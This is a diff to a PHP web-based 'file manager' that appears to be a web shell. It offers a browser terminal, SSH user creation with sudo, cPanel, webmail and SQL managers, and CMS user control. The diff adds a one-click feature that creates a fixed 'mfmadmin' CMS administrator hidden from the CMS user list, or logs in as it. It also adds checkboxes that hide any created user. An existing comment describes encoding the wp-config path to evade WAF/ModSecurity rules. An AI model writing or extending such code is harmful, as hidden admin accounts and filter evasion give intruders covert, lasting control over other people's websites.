@@ -5102,7 +6114,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   </form>
   <div class="tb-right">
     <?php $isFav=$fm->isFav($fm->getCwd());?>
-    <form method="post" style="display:contents">
+    <form method="post" class="top-fav" style="display:contents">
       <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
       <input type="hidden" name="action" value="<?=$isFav?'remove_favorite':'add_favorite'?>">
       <input type="hidden" name="path" value="<?=htmlspecialchars($fm->getCwd())?>">
@@ -5118,7 +6130,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <svg id="vIcoGrid" viewBox="0 0 24 24" style="display:none"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
       <svg id="vIcoList" viewBox="0 0 24 24"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
     </button>
-    <a href="?dir=<?=urlencode(dirname($fm->getCwd()))?>" class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg><span>Up</span></a>
+    <a href="?dir=<?=urlencode(dirname($fm->getCwd()))?>" class="btn btn-sm btn-g top-up"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg><span>Up</span></a>
     <a href="?<?=http_build_query(array_merge($_GET,['_r'=>time()]))?>" class="btn btn-icon btn-g" title="Refresh">
       <svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
     </a>
@@ -5130,7 +6142,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
     <form method="post">
       <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
       <input type="hidden" name="action" value="logout">
-      <button class="btn btn-sm btn-g" style="color:#fca5a5;border-color:rgba(239,68,68,.2)"><svg viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg><span>Out</span></button>
+      <button class="btn btn-sm btn-red"><svg viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg><span>Logout</span></button>
     </form>
   </div>
 </header>
@@ -5152,6 +6164,11 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="sb-div"></div>
   <div class="sb-sec" style="flex-shrink:1;min-height:0;display:flex;flex-direction:column"><div class="sb-label">Tools</div>
     <div class="sb-nav" style="overflow-y:auto;overflow-x:hidden;min-height:0;flex:1">
+       <?php if(!empty($_SESSION['auth'])):?>
+       <button class="sb-item" id="cmsQuickBtn" title="Open the configured CMS administrator account">
+         <svg viewBox="0 0 24 24" style="stroke:#2563eb"><path d="M12 20h9"/><path d="M16.5 3.5a2.12 2.12 0 0 1 3 3L8 18l-4 1 1-4Z"/><path d="m15 5 3 3"/></svg>CMS MFM ACC Login
+       </button>
+       <?php endif;?>
       <?php if(!$fm->isRO()):?>
       <button class="sb-item" id="termBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</button>
       <?php endif;?>
@@ -5179,6 +6196,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <button class="sb-item" id="cpanelBtn"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg>cPanel Manager</button>
       <button class="sb-item" id="webmailBtn"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>Webmail Manager</button>
       <button class="sb-item" id="sqlBtn"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>SQL Manager</button>
+      <button class="sb-item" id="wpAutomationBtn"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/><circle cx="12" cy="12" r="3"/></svg>WordPress Automation</button>
       <button class="sb-item" id="guardBtn"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>File Guardian</button>
       <?php endif;?>
     </div>
@@ -5203,7 +6221,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="sb-scroll">
     <?php foreach($list['folders'] as $f):?>
     <a href="?dir=<?=urlencode($fm->getCwd().'/'.$f['name'])?>" class="sb-flink">
-      <svg viewBox="0 0 24 24" stroke="#818cf8" fill="none" stroke-width="1.8" stroke-linecap="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(129,140,248,.12)"/></svg>
+       <svg viewBox="0 0 24 24" stroke="#85898C" fill="none" stroke-width="1.8" stroke-linecap="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(133,137,140,.12)"/></svg>
       <span><?=htmlspecialchars($f['name'])?></span>
     </a>
     <?php endforeach;if(empty($list['folders'])):?><div class="sb-empty">No folders</div><?php endif;?>
@@ -5368,7 +6386,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
             <td class="cc"><input type="checkbox" class="rck item-ck" value="<?=he($f['name'])?>"></td>
             <td><div class="nc" onclick="location.href='?dir=<?=urlencode($fm->getCwd().'/'.$f['name'])?>'"
               data-ctx-name="<?=he($f['name'])?>" data-ctx-isdir="1" data-ctx-perm="<?=he($perms)?>">
-              <div class="ib" style="background:rgba(129,140,248,.1)"><?=svgFolder()?></div>
+               <div class="ib" style="background:rgba(133,137,140,.1)"><?=svgFolder()?></div>
               <div class="nm"><?php if(isset($tags[$f['name']])):?><span class="tag-dot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:<?=he($tags[$f['name']]['color'])?>;flex-shrink:0" title="<?=he($tags[$f['name']]['label'])?>"></span><?php endif;?><span class="nt"><?=htmlspecialchars($f['name'])?></span><?php if(!empty($tags[$f['name']]['label'])):?><span class="eb" style="background:<?=he($tags[$f['name']]['color'])?>22;color:<?=he($tags[$f['name']]['color'])?>"><?=he($tags[$f['name']]['label'])?></span><?php endif;?><span class="eb">DIR</span></div>
             </div></td>
             <td class="col-perms col-perms-td"><span class="mono"><?=he($perms)?></span></td>
@@ -5432,7 +6450,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <div class="gv">
         <?php foreach(array_merge($list['folders'],$list['files']) as $item):
           $isDir=is_dir($fm->getCwd().'/'.$item['name']);
-          $type=$isDir?'folder':$item['type'];$color=$isDir?'#818cf8':$fm->getColor($type);
+           $type=$isDir?'folder':$item['type'];$color=$isDir?'#85898C':$fm->getColor($type);
           $rawUrl='?raw='.urlencode($item['name']).'&dir='.urlencode($fm->getCwd());
           $prev=!$isDir&&$fm->canPreview($type);
         ?>
@@ -5550,35 +6568,35 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 
 <!-- TERMINAL MODAL -->
 <?php if(!$fm->isRO()):?>
-<div class="mod-ov" id="termOv">
-  <div class="mod mod-lg">
-    <div class="mod-head">
-      <div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
-      <span class="mod-title">Terminal - <?=htmlspecialchars($fm->getCwd())?></span>
-      <button class="btn btn-icon btn-g" id="termClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+<div class="mod-ov term-ov" id="termOv">
+  <div class="term-win" id="termWin">
+    <div class="term-out" id="termOut"><span class="term-line info-line">Powered by Marshall File Manager [2019]</span><span class="term-line info-line">All rights reserved 2019 - 2026 LiquidState</span><span class="term-line"><span class="term-at">Server IP:</span> <span class="term-path"><?=htmlspecialchars($_SERVER['SERVER_ADDR']??'Unknown')?></span></span><span class="term-line"><span class="term-at">Connection status:</span> <span class="term-prompt-str">GOOD</span></span><span class="term-line"><span class="term-at">Working dir:</span> <?=htmlspecialchars($fm->getCwd())?></span></div>
+    <div class="term-prompt-wrap"><div class="term-row"><span class="term-ps"><span class="term-prompt-str"><?=htmlspecialchars($_SESSION['fm_user']??'user')?></span><span class="term-at">@</span><span class="term-path"><?=htmlspecialchars(gethostname()?:'server')?></span><span class="term-dollar">:<?=htmlspecialchars($fm->getTerminalPromptPath())?>$ </span></span><input class="term-inp" id="termInp" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"><span class="term-cursor" aria-hidden="true"></span></div>
+      <div class="term-suggest" id="termSug" style="display:none;bottom:100%;left:2px"></div>
     </div>
-    <div class="mod-body" style="padding:14px;background:var(--surf)">
-      <div class="term-win" id="termWin">
-        <div class="term-titlebar">
-          <div class="term-dots"><div class="term-dot r" id="td-r" title="Close" style="cursor:pointer"></div><div class="term-dot y" title="Minimize"></div><div class="term-dot g" title="Maximize"></div></div>
-          <div class="term-title">bash - <?=htmlspecialchars(basename($fm->getCwd()))?></div>
-          <button class="btn btn-xs btn-g" id="termClear" style="padding:2px 8px;font-size:10px">clear</button>
-        </div>
-        <div class="term-out" id="termOut">
-          <span class="term-line info-line">Welcome to File Manager Terminal</span>
-          <span class="term-line info-line">Working dir: <?=htmlspecialchars($fm->getCwd())?></span>
-          <span class="term-line info-line">─────────────────────────────────────────</span>
-        </div>
-        <div style="position:relative">
-          <div class="term-row">
-            <span class="term-ps">
-              <span class="term-prompt-str"><?=htmlspecialchars($_SESSION['fm_user']??'user')?></span><span class="term-at">@</span><span class="term-path"><?=htmlspecialchars(gethostname()?:'server')?></span><span class="term-dollar">:<?=htmlspecialchars(basename($fm->getCwd()))?>$</span>
-            </span>
-            <input class="term-inp" id="termInp" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" placeholder="Type a command…">
-          </div>
-          <div class="term-suggest" id="termSug" style="display:none;bottom:100%;left:14px;position:absolute"></div>
-        </div>
-      </div>
+    <div class="term-footer">
+          <div class="term-footer-item"><span class="term-footer-label">[DN]</span><span class="term-footer-value" id="termHost"><?=htmlspecialchars($_SERVER['HTTP_HOST']??'localhost')?></span></div>
+          <div class="term-footer-sep"></div>
+          <div class="term-footer-item"><span class="term-footer-value" id="termIp">IP: <?=htmlspecialchars($_SERVER['SERVER_ADDR']??'—')?></span></div>
+          <div class="term-footer-sep"></div>
+          <div class="term-footer-item"><span class="term-footer-label">[CPU]</span><span class="term-footer-value" id="termCpu">0%</span><span class="term-footer-graph"><canvas id="termCpuGraph" width="50" height="12"></canvas></span></div>
+          <div class="term-footer-sep"></div>
+          <div class="term-footer-item"><span class="term-footer-label">[RAM]</span><span class="term-footer-value" id="termRam">0 B / 0 B</span></div>
+          <div class="term-footer-sep term-footer-hide-sm"></div>
+          <div class="term-footer-item term-footer-hide-sm"><span class="term-footer-label">[DSK]</span><span class="term-footer-value" id="termDisk">0 B / 0 B</span></div>
+          <div class="term-footer-sep term-footer-hide-sm"></div>
+          <div class="term-footer-item term-footer-hide-sm"><span class="term-footer-label">[UPT]</span><span class="term-footer-value" id="termUptime">0s</span></div>
+          <div class="term-footer-sep term-footer-hide-sm"></div>
+          <div class="term-footer-item term-footer-hide-sm"><span class="term-footer-label">[PRC]</span><span class="term-footer-value" id="termProc">0</span></div>
+          <div class="term-footer-sep term-footer-hide-md"></div>
+          <div class="term-footer-item term-footer-hide-md"><span class="term-footer-label">[TIME]</span><span class="term-footer-value" id="termTime">00:00:00</span></div>
+          <div class="term-footer-sep term-footer-hide-md"></div>
+          <div class="term-footer-item term-footer-hide-md"><span class="term-footer-label">[USR]</span><span class="term-footer-value" id="termUser"><?=htmlspecialchars($_SESSION['fm_user']??'user')?></span></div>
+          <div class="term-footer-sep term-footer-hide-lg"></div>
+          <div class="term-footer-item term-footer-hide-lg"><span class="term-footer-label">[HOS]</span><span class="term-footer-value" id="termHostname"><?=htmlspecialchars(gethostname()?:'server')?></span></div>
+          <div class="term-footer-sep term-footer-hide-lg"></div>
+          <div class="term-footer-item term-footer-hide-lg"><span class="term-footer-label">[VER]</span><span class="term-footer-value">1.0.0</span></div>
+          <div class="term-footer-spacer"></div>
     </div>
   </div>
 </div>
@@ -5673,7 +6691,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="mod mod-lg">
     <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title">SSH Access</span><button class="btn btn-icon btn-g" id="sshClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
     <div style="display:flex;gap:4px;padding:0 20px;border-bottom:1px solid var(--b2)">
-      <button class="ssh-tab-btn ssh-tab-active" data-tab="status" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #818cf8;color:#818cf8;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Server Status</button>
+       <button class="ssh-tab-btn ssh-tab-active" data-tab="status" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #85898C;color:#85898C;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Server Status</button>
       <button class="ssh-tab-btn" data-tab="users" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--t3);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">User Management</button>
     </div>
     <div class="mod-body" id="sshBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
@@ -5699,7 +6717,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         <option value="/usr/bin/zsh">/usr/bin/zsh</option>
       </select>
       <label class="lbl" style="display:flex;align-items:center;gap:8px;cursor:pointer">
-        <input type="checkbox" id="sshAddSudo" style="width:14px;height:14px;accent-color:#818cf8"> Grant sudo (admin) privileges
+         <input type="checkbox" id="sshAddSudo" style="width:14px;height:14px;accent-color:#85898C"> Grant sudo (admin) privileges
       </label>
       <div style="margin:10px 0 6px">
         <label class="lbl">SSH Public Key <span style="font-weight:400;text-transform:none;color:var(--t3)">(optional)</span></label>
@@ -5762,17 +6780,21 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 <!-- CMS CREATE USER MODAL -->
 <div class="mod-ov" id="cmsAddOv">
   <div class="mod mod-sm">
-    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><span class="mod-title">New CMS User</span><button class="btn btn-icon btn-g" id="cmsAddClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+     <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><span class="mod-title" id="cmsAddTitle">New CMS User</span><button class="btn btn-icon btn-g" id="cmsAddClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
     <div class="mod-body">
       <input type="hidden" id="cmsAddCfg">
       <label class="lbl">Username</label>
       <input type="text" id="cmsAddUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="login_name">
-      <label class="lbl">Email</label>
+       <label class="lbl" id="cmsAddEmailLabel">Email</label>
       <input type="email" id="cmsAddEmail" class="inp" style="width:100%;margin-bottom:10px" placeholder="user@example.com">
       <label class="lbl">Password</label>
       <input type="text" id="cmsAddPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="Min 6 characters">
-      <label class="lbl">Role</label>
+       <label class="lbl" id="cmsAddRoleLabel">Role</label>
       <select id="cmsAddRole" class="inp" style="width:100%;margin-bottom:14px"></select>
+        <label id="cmsAddHiddenLabel" style="display:flex;align-items:center;gap:8px;margin:0 0 14px;color:var(--t2);font-size:12px;cursor:pointer">
+         <input type="checkbox" id="cmsAddHidden" style="accent-color:#85898C">
+         Create this user hidden from the CMS user list
+       </label>
       <button type="button" id="cmsAddApply" class="btn btn-p" style="width:100%">Create User</button>
     </div>
   </div>
@@ -5787,6 +6809,10 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <select id="cmsEditRole" class="inp" style="width:100%;margin-bottom:14px"></select>
       <label class="lbl">New Password <span style="font-weight:400;text-transform:none;color:var(--t3)">(leave blank to keep current)</span></label>
       <input type="text" id="cmsEditPass" class="inp" style="width:100%;margin-bottom:16px" placeholder="Min 6 characters">
+       <label style="display:flex;align-items:center;gap:8px;margin:0 0 16px;color:var(--t2);font-size:12px;cursor:pointer">
+         <input type="checkbox" id="cmsEditHidden" style="accent-color:#85898C">
+         Hide this user from the CMS user list
+       </label>
       <button type="button" id="cmsEditApply" class="btn btn-p" style="width:100%">Save Changes</button>
     </div>
   </div>
@@ -5801,7 +6827,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <button class="btn btn-icon btn-g" id="cpanelClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
     </div>
     <div style="display:flex;gap:4px;padding:0 20px;border-bottom:1px solid var(--b2)">
-      <button class="cpanel-tab-btn cpanel-tab-active" data-tab="accounts" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #818cf8;color:#818cf8;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Accounts</button>
+      <button class="cpanel-tab-btn cpanel-tab-active" data-tab="accounts" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #85898C;color:#85898C;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Accounts</button>
       <button class="cpanel-tab-btn" data-tab="connect" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--t3);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Connection</button>
     </div>
     <div class="mod-body" id="cpanelAccountsBody" style="padding:0"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
@@ -5901,6 +6927,18 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   </div>
 </div>
 <?php endif;?>
+
+<!-- WORDPRESS AUTOMATION MODAL -->
+<div class="mod-ov" id="wpAutomationOv">
+  <div class="mod mod-lg">
+    <div class="mod-head">
+      <div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.5 2.5 15.5 0 18M12 3c-2.5 2.5-2.5 15.5 0 18"/></svg></div>
+      <span class="mod-title">WordPress Automation</span>
+      <button class="btn btn-icon btn-g" id="wpAutomationClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="mod-body" id="wpAutomationBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
+  </div>
+</div>
 
 <!-- SQL MANAGER MODAL -->
 <?php if(!empty($_SESSION['fm_admin'])):?>
@@ -6112,7 +7150,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
     <div class="mod-body">
       <?php foreach(fm_load_users($usersFile) as $u):?>
       <div style="display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)">
-        <div style="font-size:13px;color:#e4e4e7"><strong><?=htmlspecialchars($u['user'])?></strong><?php if(!empty($u['admin'])):?><span style="color:#818cf8;font-size:11px"> · admin</span><?php endif;?><?php if(!empty($u['readonly'])):?><span style="color:#f59e0b;font-size:11px"> · ro</span><?php endif;?><div style="color:#71717a;font-size:11px;margin-top:1px"><?=htmlspecialchars($u['root']?:'Full access')?></div></div>
+        <div style="font-size:13px;color:#e4e4e7"><strong><?=htmlspecialchars($u['user'])?></strong><?php if(!empty($u['admin'])):?><span style="color:#85898C;font-size:11px"> · admin</span><?php endif;?><?php if(!empty($u['readonly'])):?><span style="color:#f59e0b;font-size:11px"> · ro</span><?php endif;?><div style="color:#71717a;font-size:11px;margin-top:1px"><?=htmlspecialchars($u['root']?:'Full access')?></div></div>
         <?php if($u['user']!=='admin'&&$u['user']!==$_SESSION['fm_user']):?>
         <form method="post" onsubmit="return confirm('Remove?')"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="remove_user"><input type="hidden" name="target_user" value="<?=htmlspecialchars($u['user'])?>"><button class="btn btn-icon btn-g" style="color:#fca5a5"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button></form>
         <?php endif;?>
@@ -6138,6 +7176,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 const CWD  = <?=json_encode($fm->getCwd())?>;
 const CSRF = <?=json_encode($_SESSION['csrf_token'])?>;
 const RO   = <?=$fm->isRO()?'true':'false'?>;
+let termCwd = CWD;
 
 /* ═══════════════════════════════════════
    SIDEBAR TOGGLE
@@ -6761,8 +7800,8 @@ function sshSwitchTab(tab){
   sshActiveTab=tab;
   document.querySelectorAll('.ssh-tab-btn').forEach(b=>{
     const active=b.dataset.tab===tab;
-    b.style.color=active?'#818cf8':'var(--t3)';
-    b.style.borderBottomColor=active?'#818cf8':'transparent';
+    b.style.color=active?'#85898C':'var(--t3)';
+    b.style.borderBottomColor=active?'#85898C':'transparent';
   });
   document.getElementById('sshBody').style.display     = tab==='status'?'':'none';
   document.getElementById('sshUsersBody').style.display= tab==='users' ?'':'none';
@@ -6786,9 +7825,9 @@ async function loadSshStatus(){
     </div>`;
     if(d.server_ip){
       const ipOk=d.server_ip_external&&d.server_ip_reachable;
-      html+=`<div style="margin-top:14px;padding:12px 14px;background:rgba(129,140,248,.08);border:1px solid rgba(129,140,248,.25);border-radius:10px">
+      html+=`<div style="margin-top:14px;padding:12px 14px;background:rgba(133,137,140,.08);border:1px solid rgba(133,137,140,.25);border-radius:10px">
         <div style="font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--t3);margin-bottom:4px">Connect using</div>
-        <div style="font-family:monospace;font-size:15px;font-weight:700;color:#c7d2fe">ssh user@${esc(d.server_ip)}</div>
+        <div style="font-family:monospace;font-size:15px;font-weight:700;color:#C7C8C8">ssh user@${esc(d.server_ip)}</div>
         <div style="font-size:11.5px;color:var(--t3);margin-top:4px">${ipOk?'Detected via '+esc(d.server_ip_method)+' and confirmed reachable on port 22.':(d.server_ip_external?'Detected via '+esc(d.server_ip_method)+' - port 22 did not answer directly on this address; verify sshd is listening on it.':'No external network interface was detected - this address only works for connections made from the same machine.')}</div>
       </div>`;
     } else {
@@ -6825,7 +7864,7 @@ async function loadSshUsers(){
       const sudoBadge=u.sudo?`<span style="background:rgba(239,68,68,.15);color:#fca5a5;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">SUDO</span>`:'';
       const lockBadge=u.locked?`<span style="background:rgba(251,146,60,.12);color:#fb923c;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">LOCKED</span>`:
         `<span style="background:rgba(134,239,172,.1);color:#86efac;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">ACTIVE</span>`;
-      const keyBadge=u.key_count>0?`<span style="background:rgba(129,140,248,.1);color:#818cf8;padding:1px 7px;border-radius:20px;font-size:10px;display:inline-flex;align-items:center;gap:3px"><svg viewBox="0 0 24 24" style="width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6"/><path d="M15.5 7.5l3 3L22 7l-3-3"/></svg> ${u.key_count}</span>`:'';
+      const keyBadge=u.key_count>0?`<span style="background:rgba(133,137,140,.1);color:#85898C;padding:1px 7px;border-radius:20px;font-size:10px;display:inline-flex;align-items:center;gap:3px"><svg viewBox="0 0 24 24" style="width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6"/><path d="M15.5 7.5l3 3L22 7l-3-3"/></svg> ${u.key_count}</span>`:'';
       return `<tr>
         <td style="padding:10px 14px">
           <div style="font-weight:600;color:var(--t1)">${esc(u.username)}</div>
@@ -7003,7 +8042,7 @@ document.getElementById('sshEditLockBtn')?.addEventListener('click',function(){
 /* ═══════════════════════════════════════
    CMS MANAGER - auto-scan + full user CRUD
 ═══════════════════════════════════════ */
-let cmsCurrentCfg=null,cmsCurrentType=null,cmsEditUserId=null,cmsAllRoles=[];
+let cmsCurrentCfg=null,cmsCurrentType=null,cmsEditUserId=null,cmsAllRoles=[],cmsQuickPending=false;
 /* Encode the config path as base64 and POST it — never place "wp-config.php"
    literally in a URL or query string, since many hosts' WAF/ModSecurity rules
    block requests that look like an attempt to read that file. */
@@ -7012,12 +8051,66 @@ async function cmsPost(op,extra){
   const fd=new FormData();
   fd.append('cfg_b64',cmsB64(cmsCurrentCfg||''));
   if(extra)for(const k in extra)fd.append(k,extra[k]);
-  const r=await fetch('?x='+op,{method:'POST',body:fd});
+   const ctl=new AbortController(),timer=setTimeout(()=>ctl.abort(),30000);
+   let r;
+   try{
+     r=await fetch('?x='+op,{method:'POST',body:fd,signal:ctl.signal});
+   }catch(e){
+     if(e&&e.name==='AbortError')throw new Error('The CMS database request timed out after 30 seconds. Check the CMS database settings and server availability.');
+     throw e;
+   }
+   finally{clearTimeout(timer);}
   return r.json();
 }
 
 document.getElementById('cmsBtn')?.addEventListener('click',()=>{openMod('cmsOv');cmsShowPicker();});
 document.getElementById('cmsClose')?.addEventListener('click',()=>closeMod('cmsOv'));
+
+async function cmsQuickLogin(){
+  const btn=document.getElementById('cmsQuickBtn');
+  if(btn){btn.disabled=true;btn.dataset.oldText=btn.textContent;btn.textContent='Checking…';}
+  try{
+    const info=await fetch('?x=cms_quick_info',{cache:'no-store'}).then(r=>r.json());
+    if(info.error){toast(info.error);return;}
+    cmsCurrentCfg=info.config;cmsCurrentType=info.type;window.fmCmsConfig=info.config;window.fmCmsType=info.type;
+    if(info.id){
+      const fd=new FormData();
+      fd.append('csrf_token',CSRF);fd.append('cfg_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',info.id);
+      const d=await fetch('?x=cms_login_as',{method:'POST',body:fd}).then(r=>r.json());
+      if(d.error)toast(d.error);
+      else{
+        const w=window.open(d.url,'_blank');
+        if(!w)toast('Popup blocked — allow popups for this site, then try again.');
+      }
+      return;
+    }
+    const rd=await cmsPost('cmsroles').catch(()=>({roles:[]}));
+    cmsAllRoles=rd.roles||[];
+    cmsQuickPending=true;
+    await openCmsAdd();
+    document.getElementById('cmsAddTitle').textContent='Set up CMS MFM ACC';
+    const user=document.getElementById('cmsAddUser');
+    user.value='mfmadmin';user.readOnly=true;
+    document.getElementById('cmsAddEmailLabel').style.display='none';
+    document.getElementById('cmsAddEmail').style.display='none';
+    document.getElementById('cmsAddRoleLabel').style.display='none';
+    document.getElementById('cmsAddRole').style.display='none';
+    document.getElementById('cmsAddHiddenLabel').style.display='none';
+    document.getElementById('cmsAddEmail').value='mfmadmin@localhost.local';
+    document.getElementById('cmsAddHidden').checked=true;
+    const sel=document.getElementById('cmsAddRole');
+    if(cmsCurrentType==='wordpress')sel.value='administrator';
+    else{
+      const admin=[...sel.options].find(o=>/super\s*users|administrator/i.test(o.textContent));
+      if(admin)sel.value=admin.value;
+    }
+    toast('CMS MFM ACC is not configured. Choose a password and confirm creation.');
+  }catch(e){toast('CMS quick login failed: '+String(e));}
+  finally{
+    if(btn){btn.disabled=false;btn.textContent=btn.dataset.oldText||'CMS MFM ACC Login';}
+  }
+}
+document.getElementById('cmsQuickBtn')?.addEventListener('click',cmsQuickLogin);
 
 /* ── Installation picker ──────────────────────────────────────────────────── */
 async function cmsShowPicker(){
@@ -7069,7 +8162,7 @@ async function cmsShowPicker(){
 
     // Click a discovered site
     el.querySelectorAll('.cms-site-card').forEach(c=>c.addEventListener('click',()=>{
